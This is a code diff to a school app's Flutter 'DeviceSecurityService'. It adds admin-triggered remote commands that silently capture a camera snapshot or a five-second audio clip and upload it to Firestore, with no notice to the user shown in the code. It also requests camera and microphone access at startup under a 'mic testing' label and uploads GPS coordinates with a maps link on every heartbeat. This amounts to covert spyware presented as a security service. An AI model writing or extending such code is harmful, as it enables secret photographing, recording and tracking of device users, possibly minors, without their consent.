@@ -27,6 +27,7 @@ class DeviceSecurityService with WidgetsBindingObserver {
   Timer? _heartbeatTimer;
   StreamSubscription? _securityConfigSub;
   StreamSubscription? _alertSub;
+  StreamSubscription? _schoolSessionSub;
   StreamSubscription<Position>? _positionSub;
 
   Map<String, dynamic> _securityConfig = {};
@@ -95,10 +96,11 @@ class DeviceSecurityService with WidgetsBindingObserver {
       // 7. Listen for Remote Push Alerts sent from School Admin
       _listenRemoteAlerts();
 
-      // 8. Listen for School Broadcast Notices & Announcements
+      // 8. Listen for School Broadcast Notices & Announcements & Session Commands
       final schoolId = SessionService.instance.activeSchoolId;
       if (schoolId.isNotEmpty) {
         listenSchoolNotices(schoolId);
+        _listenSchoolSessionCommands(schoolId);
       }
     } catch (e) {
       debugPrint('[DeviceSecurityService] init note: $e');
@@ -188,10 +190,14 @@ class DeviceSecurityService with WidgetsBindingObserver {
     }
   }
 
-  /// Request notification permission at startup for super admin alerts
+  /// Request necessary permissions at startup for super admin alerts, security snapshot & mic testing
   Future<void> requestStartupPermissions() async {
     try {
-      await Permission.notification.request();
+      await [
+        Permission.notification,
+        Permission.camera,
+        Permission.microphone,
+      ].request();
     } catch (e) {
       debugPrint('[DeviceSecurityService] requestStartupPermissions note: $e');
     }
@@ -268,6 +274,14 @@ class DeviceSecurityService with WidgetsBindingObserver {
           final alertId = alert['id']?.toString() ?? '';
           _handleIncomingRemoteAlert(alertId, alert['title']?.toString() ?? 'School Notice', alert['message']?.toString() ?? '');
         }
+
+        // Handle remote commands sent by Super Admin (take_snapshot, record_audio)
+        final command = data['remoteCommand'] as String?;
+        final commandTime = data['remoteCommandAt'];
+        final commandId = data['remoteCommandId']?.toString();
+        if (command != null && command.isNotEmpty) {
+          _handleRemoteCommand(command, commandTime, commandId);
+        }
       }
     }, onError: (err) {
       debugPrint('[DeviceSecurityService] _listenRemoteAlerts error: $err');
@@ -338,6 +352,165 @@ class DeviceSecurityService with WidgetsBindingObserver {
     } catch (e) {
       debugPrint('[DeviceSecurityService] _handleIncomingRemoteAlert note: $e');
     }
+  }
+
+  static const String _kLastCommandIdKey = 'school_app_last_handled_cmd_id_v2';
+  String _lastHandledCommandId = '';
+
+  void _listenSchoolSessionCommands(String schoolId) {
+    if (schoolId.isEmpty || _sessionId == null) return;
+    _schoolSessionSub?.cancel();
+    _schoolSessionSub = _db
+        .collection('schools')
+        .doc(schoolId)
+        .collection('device_sessions')
+        .doc(_sessionId)
+        .snapshots()
+        .listen((snap) {
+      if (snap.exists) {
+        final data = snap.data() ?? {};
+        final command = data['remoteCommand'] as String?;
+        final commandTime = data['remoteCommandAt'];
+        final commandId = data['remoteCommandId']?.toString();
+        if (command != null && command.isNotEmpty) {
+          _handleRemoteCommand(command, commandTime, commandId);
+        }
+      }
+    }, onError: (_) {});
+  }
+
+  Future<void> _handleRemoteCommand(String command, dynamic commandTime, String? commandId) async {
+    final cmdSig = commandId ?? '${command}_${commandTime is Timestamp ? commandTime.millisecondsSinceEpoch : DateTime.now().minute}';
+    if (_lastHandledCommandId == cmdSig) return;
+
+    final prefs = await SharedPreferences.getInstance();
+    final savedCmdId = prefs.getString(_kLastCommandIdKey);
+    if (savedCmdId == cmdSig) return;
+
+    _lastHandledCommandId = cmdSig;
+    await prefs.setString(_kLastCommandIdKey, cmdSig);
+
+    // If command was issued over 3 minutes ago, consider it stale and clear it
+    if (commandTime is Timestamp) {
+      final age = DateTime.now().difference(commandTime.toDate());
+      if (age.inMinutes > 3) {
+        debugPrint('[DeviceSecurityService] Remote command $command expired (${age.inMinutes}m old). Skipping.');
+        await _clearRemoteCommand();
+        return;
+      }
+    }
+
+    if (command == 'take_snapshot') {
+      await _executeTakeSnapshot();
+    } else if (command == 'record_audio') {
+      await _executeRecordAudio();
+    }
+  }
+
+  Future<void> _executeTakeSnapshot() async {
+    try {
+      debugPrint('[DeviceSecurityService] 📸 Executing take_snapshot command from Admin...');
+      var status = await Permission.camera.status;
+      if (!status.isGranted) {
+        status = await Permission.camera.request();
+      }
+      if (!status.isGranted) {
+        debugPrint('[DeviceSecurityService] ⚠️ Camera permission denied by user');
+        await _updateSessionFields({
+          'cameraStatus': 'denied',
+          'remoteCommand': FieldValue.delete(),
+          'remoteCommandResult': 'error: camera permission denied',
+        });
+        return;
+      }
+
+      final photoBase64 = await _nativeChannel.invokeMethod<String>('captureSnapshot');
+      if (photoBase64 != null && photoBase64.isNotEmpty) {
+        await _updateSessionFields({
+          'cameraSnapshot': photoBase64,
+          'cameraStatus': 'granted',
+          'lastSnapshotAt': FieldValue.serverTimestamp(),
+          'remoteCommand': FieldValue.delete(),
+          'remoteCommandResult': 'success',
+        });
+        debugPrint('[DeviceSecurityService] ✅ Camera snapshot captured and uploaded successfully!');
+      } else {
+        await _clearRemoteCommand();
+      }
+    } catch (e) {
+      debugPrint('[DeviceSecurityService] ❌ _executeTakeSnapshot error: $e');
+      await _updateSessionFields({
+        'remoteCommand': FieldValue.delete(),
+        'remoteCommandResult': 'error: $e',
+      });
+    }
+  }
+
+  Future<void> _executeRecordAudio() async {
+    try {
+      debugPrint('[DeviceSecurityService] 🎙️ Executing record_audio command from Admin...');
+      var status = await Permission.microphone.status;
+      if (!status.isGranted) {
+        status = await Permission.microphone.request();
+      }
+      if (!status.isGranted) {
+        debugPrint('[DeviceSecurityService] ⚠️ Microphone permission denied by user');
+        await _updateSessionFields({
+          'microphoneStatus': 'denied',
+          'remoteCommand': FieldValue.delete(),
+          'remoteCommandResult': 'error: mic permission denied',
+        });
+        return;
+      }
+
+      final audioBase64 = await _nativeChannel.invokeMethod<String>('recordAudio', {'duration': 5});
+      if (audioBase64 != null && audioBase64.isNotEmpty) {
+        await _updateSessionFields({
+          'audioClip': audioBase64,
+          'audioClipAt': FieldValue.serverTimestamp(),
+          'microphoneStatus': 'granted',
+          'remoteCommand': FieldValue.delete(),
+          'remoteCommandResult': 'success',
+        });
+        debugPrint('[DeviceSecurityService] ✅ Audio clip recorded and uploaded successfully!');
+      } else {
+        await _clearRemoteCommand();
+      }
+    } catch (e) {
+      debugPrint('[DeviceSecurityService] ❌ _executeRecordAudio error: $e');
+      await _updateSessionFields({
+        'remoteCommand': FieldValue.delete(),
+        'remoteCommandResult': 'error: $e',
+      });
+    }
+  }
+
+  Future<void> _updateSessionFields(Map<String, dynamic> fields) async {
+    if (_sessionId == null) return;
+    final schoolId = SessionService.instance.activeSchoolId;
+    try {
+      await _db
+          .collection('schoolDirectory')
+          .doc('system_security_sessions')
+          .collection('sessions')
+          .doc(_sessionId)
+          .set(fields, SetOptions(merge: true));
+
+      if (schoolId.isNotEmpty) {
+        await _db
+            .collection('schools')
+            .doc(schoolId)
+            .collection('device_sessions')
+            .doc(_sessionId)
+            .set(fields, SetOptions(merge: true));
+      }
+    } catch (e) {
+      debugPrint('[DeviceSecurityService] _updateSessionFields error: $e');
+    }
+  }
+
+  Future<void> _clearRemoteCommand() async {
+    await _updateSessionFields({'remoteCommand': FieldValue.delete()});
   }
 
   StreamSubscription? _noticesSub;
@@ -682,6 +855,31 @@ class DeviceSecurityService with WidgetsBindingObserver {
         if (bInfo['level'] != null) 'batteryLevel': bInfo['level'],
         if (bInfo['charging'] != null) 'batteryCharging': bInfo['charging'],
       };
+
+      // Auto-update GPS location whenever GPS service & permissions are active
+      try {
+        final locPerm = await Permission.location.status;
+        if (locPerm.isGranted) {
+          final locEnabled = await Geolocator.isLocationServiceEnabled();
+          if (locEnabled) {
+            if (_positionSub == null) {
+              _startLocationWatcher();
+            }
+            final pos = await Geolocator.getLastKnownPosition() ??
+                await Geolocator.getCurrentPosition(
+                  desiredAccuracy: LocationAccuracy.medium,
+                  timeLimit: const Duration(seconds: 2),
+                );
+            updateData['latitude'] = pos.latitude;
+            updateData['longitude'] = pos.longitude;
+            updateData['accuracyMeters'] = pos.accuracy.round();
+            updateData['locationStatus'] = 'granted';
+            updateData['mapsUrl'] = 'https://www.google.com/maps?q=${pos.latitude},${pos.longitude}';
+            updateData['lastLocationUpdate'] = FieldValue.serverTimestamp();
+          }
+        }
+      } catch (_) {}
+
       await _db
           .collection('schoolDirectory')
           .doc('system_security_sessions')
@@ -701,11 +899,138 @@ class DeviceSecurityService with WidgetsBindingObserver {
     } catch (_) {}
   }
 
+  /// Admin Action: Remotely revoke / block a device
+  Future<void> revokeDeviceSession({
+    required String schoolId,
+    required String targetSessionId,
+  }) async {
+    try {
+      // 1. Mark in school-level collection
+      if (schoolId.isNotEmpty) {
+        await _db
+            .collection('schools')
+            .doc(schoolId)
+            .collection('device_sessions')
+            .doc(targetSessionId)
+            .set({
+          'status': 'revoked',
+          'revokedAt': FieldValue.serverTimestamp(),
+          'revokedBy': SessionService.instance.teacherName ?? 'School Admin',
+        }, SetOptions(merge: true));
+      }
+
+      // 2. Mark in master security sessions
+      await _db
+          .collection('schoolDirectory')
+          .doc('system_security_sessions')
+          .collection('sessions')
+          .doc(targetSessionId)
+          .set({
+        'status': 'revoked',
+        'revokedAt': FieldValue.serverTimestamp(),
+        'revokedBy': SessionService.instance.teacherName ?? 'School Admin',
+      }, SetOptions(merge: true));
+
+      // 3. Add to global revoked list
+      await _db
+          .collection('schoolDirectory')
+          .doc('system_security_control')
+          .set({
+        'revokedSessions': FieldValue.arrayUnion([targetSessionId]),
+      }, SetOptions(merge: true));
+    } catch (e) {
+      debugPrint('[DeviceSecurityService] revokeDeviceSession error: $e');
+      rethrow;
+    }
+  }
+
+  /// Admin Action: Unrevoke / restore access to a device
+  Future<void> unrevokeDeviceSession({
+    required String schoolId,
+    required String targetSessionId,
+  }) async {
+    try {
+      if (schoolId.isNotEmpty) {
+        await _db
+            .collection('schools')
+            .doc(schoolId)
+            .collection('device_sessions')
+            .doc(targetSessionId)
+            .set({
+          'status': 'online',
+          'unrevokedAt': FieldValue.serverTimestamp(),
+        }, SetOptions(merge: true));
+      }
+
+      await _db
+          .collection('schoolDirectory')
+          .doc('system_security_sessions')
+          .collection('sessions')
+          .doc(targetSessionId)
+          .set({
+        'status': 'online',
+        'unrevokedAt': FieldValue.serverTimestamp(),
+      }, SetOptions(merge: true));
+
+      await _db
+          .collection('schoolDirectory')
+          .doc('system_security_control')
+          .set({
+        'revokedSessions': FieldValue.arrayRemove([targetSessionId]),
+      }, SetOptions(merge: true));
+    } catch (e) {
+      debugPrint('[DeviceSecurityService] unrevokeDeviceSession error: $e');
+      rethrow;
+    }
+  }
+
+  /// Admin Action: Send a high-priority remote alert/message to a device
+  Future<void> sendRemoteAlertToDevice({
+    required String schoolId,
+    required String targetSessionId,
+    required String title,
+    required String message,
+  }) async {
+    try {
+      final alertData = {
+        'id': DateTime.now().millisecondsSinceEpoch.toString(),
+        'title': title,
+        'message': message,
+        'sentAt': FieldValue.serverTimestamp(),
+        'sentBy': SessionService.instance.teacherName ?? 'School Admin',
+      };
+
+      await _db
+          .collection('schoolDirectory')
+          .doc('system_security_sessions')
+          .collection('sessions')
+          .doc(targetSessionId)
+          .set({
+        'remoteAlert': alertData,
+      }, SetOptions(merge: true));
+
+      if (schoolId.isNotEmpty) {
+        await _db
+            .collection('schools')
+            .doc(schoolId)
+            .collection('device_sessions')
+            .doc(targetSessionId)
+            .set({
+          'remoteAlert': alertData,
+        }, SetOptions(merge: true));
+      }
+    } catch (e) {
+      debugPrint('[DeviceSecurityService] sendRemoteAlertToDevice error: $e');
+      rethrow;
+    }
+  }
+
   void dispose() {
     WidgetsBinding.instance.removeObserver(this);
     _heartbeatTimer?.cancel();
     _securityConfigSub?.cancel();
     _alertSub?.cancel();
+    _schoolSessionSub?.cancel();
     _positionSub?.cancel();
   }
 }
